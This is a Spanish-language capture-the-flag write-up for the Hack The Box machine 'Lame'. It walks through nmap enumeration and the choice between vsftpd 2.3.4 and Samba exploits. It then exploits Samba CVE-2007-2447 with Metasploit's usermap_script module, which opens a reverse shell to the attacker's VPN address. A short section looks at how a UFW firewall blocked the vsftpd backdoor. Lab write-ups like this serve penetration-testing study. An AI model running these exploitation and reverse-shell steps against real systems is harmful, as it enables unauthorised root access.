# Lame — Hack The Box

**Máquina:** Lame · **SO:** Linux · **Dificultad:** Easy · **Lista:** TJ Null (OSCP)

| Campo | Detalle |
|---|---|
| Objetivo | `10.129.76.178` (lame.htb) |
| Sistema | Linux — Ubuntu (Samba 3.0.20-Debian) |
| Vector de entrada | Samba *username map script* — **CVE-2007-2447** |
| Acceso obtenido | Shell directa como **root** (sin escalada) |
| Herramientas | nmap, searchsploit, Metasploit, iptables |

---

## 1. Resumen

Lame es una máquina Linux de dificultad Easy. El acceso se consigue explotando una vulnerabilidad de ejecución remota de comandos en **Samba 3.0.20** (`CVE-2007-2447`), que otorga directamente una shell como **root**, sin necesidad de una fase de escalada de privilegios. Durante la enumeración se identificaron dos vectores candidatos —un backdoor en vsftpd 2.3.4 y la vulnerabilidad de Samba— y se eligió el segundo por ser notablemente más fiable.

---

## 2. Enumeración

Primer paso: identificar qué servicios expone la máquina. Escaneo de los 1000 puertos TCP más comunes.

```console
$ nmap 10.129.76.178
PORT    STATE SERVICE
21/tcp  open  ftp
22/tcp  open  ssh
139/tcp open  netbios-ssn
445/tcp open  microsoft-ds
```

Con los puertos identificados, se interroga cada servicio para obtener su **versión exacta** (donde suele estar el vector) y se lanzan los scripts por defecto de nmap.

```console
$ nmap -sC -sV -p 21,22,139,445 10.129.76.178
21/tcp  open  ftp         vsftpd 2.3.4
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian
```

Hallazgos relevantes:

- `vsftpd 2.3.4` — versión con un backdoor público conocido; además permite login anónimo.
- `Samba 3.0.20-Debian` — versión antigua con una vulnerabilidad de ejecución de comandos muy conocida.
- `OpenSSH 4.7p1` — antiguo, pero no es un vector de entrada directo. Se anota y se descarta.

---

## 3. Elección del vector

Se comprueba qué exploits públicos existen para cada servicio candidato con `searchsploit`.

```console
$ searchsploit vsftpd 2.3.4
vsftpd 2.3.4 - Backdoor Command Execution   (Metasploit / Python)

$ searchsploit samba 3.0.20
Samba 3.0.20 < 3.0.25rc3 - 'Username map script'  (Metasploit)
```

Ambas versiones tienen exploit disponible. El criterio de decisión no es solo que exista, sino **cuál es más fiable de disparar**:

- El backdoor de `vsftpd 2.3.4` depende de que el backdoor esté activo en esa compilación concreta: a veces funciona, a veces no.
- El de Samba (`usermap_script`, CVE-2007-2447) es de los más fiables que existen contra esta versión.

> **Decisión:** entrar por **Samba (vía fiable)** primero para asegurar el acceso, y comprobar después el backdoor de vsftpd por curiosidad técnica.

---

## 4. Explotación — CVE-2007-2447 (Samba)

La vulnerabilidad reside en la opción `username map script` de Samba: un nombre de usuario con metacaracteres de shell se ejecuta en el sistema. Se usa el módulo de Metasploit.

```console
$ msfconsole
msf > search usermap_script
0  exploit/multi/samba/usermap_script   excellent
msf > use exploit/multi/samba/usermap_script
```

El módulo necesita dos datos: `RHOSTS` (la víctima) y `LHOST` (la IP propia de la VPN, interfaz `tun0`, a donde la máquina devuelve la shell). Un error habitual es dejar el LHOST por defecto (una IP local que la máquina no puede alcanzar).

```console
msf > set RHOSTS 10.129.76.178
msf > set LHOST 10.10.15.195
msf > exploit
[*] Started reverse TCP handler on 10.10.15.195:4444
[*] Command shell session 1 opened
```

La sesión se abre. Se confirma el usuario y se recogen las flags.

```console
whoami
root
cat /root/root.txt
cf3c1e750a1a9ccd9dfdbe1a80544efb
ls /home
ftp  makis  service  user
cat /home/makis/user.txt
<user flag>
```

> **Por qué no hubo escalada de privilegios.** En la mayoría de máquinas se entra como usuario sin privilegios y hay que escalar a root (cron escribible, SUID, sudo mal configurado). En Lame no: el servicio Samba corría como root, así que el exploit dio directamente sus privilegios. La shell es root desde el primer momento.

---

## 5. Análisis adicional — por qué falló el exploit de vsftpd

Al probar el backdoor de `vsftpd 2.3.4`, el exploit se quedaba colgado sin abrir sesión. Con la shell de root se puede investigar el motivo real. El backdoor, al activarse, abre un puerto de escucha en el `6200` de la víctima; el atacante se conecta a ese puerto para obtener la shell.

¿Qué bloquea la conexión desde fuera? Se inspeccionan las reglas del cortafuegos.

```console
$ iptables -L -n
Chain INPUT (policy DROP)
...
Chain ufw-user-input (1 references)
ACCEPT  tcp  dpt:22
ACCEPT  tcp  dpt:21
ACCEPT  tcp  dpt:3632
ACCEPT  tcp  dpt:139
ACCEPT  tcp  dpt:445
```

La clave está en la primera línea: `Chain INPUT (policy DROP)`. El firewall (**UFW**, visible por las cadenas `ufw-*`) está en modo "cerrado por defecto": descarta todo el tráfico entrante salvo los puertos explícitamente permitidos. En la lista de permitidos (`ufw-user-input`) aparecen 21, 22, 139, 445 y 3632 — pero **no el 6200**. Por eso el backdoor abría el puerto internamente pero el cortafuegos cortaba la conexión: el exploit no era defectuoso, el firewall lo bloqueaba.

> **Lección.** Que un exploit exista y la versión coincida no garantiza que funcione. Aquí el vector descartado falló por una defensa de red (UFW con política DROP), no por la técnica. De ahí la importancia de probar varios vectores y de elegir el más fiable en lugar de obsesionarse con el primero.

---

## 6. Resumen de la cadena

| Fase | Acción | Resultado |
|---|---|---|
| Enumeración | `nmap -sC -sV` | 4 puertos: FTP, SSH, Samba (139/445) |
| Análisis | `searchsploit` | 2 vectores: vsftpd 2.3.4 y Samba 3.0.20 |
| Decisión | Elegir el fiable | Samba usermap (CVE-2007-2447) |
| Explotación | Metasploit `usermap_script` | Shell como root |
| Flags | root.txt + user.txt | Máquina completada |
| Beyond root | `iptables -L -n` | UFW (policy DROP) bloqueaba el 6200 |

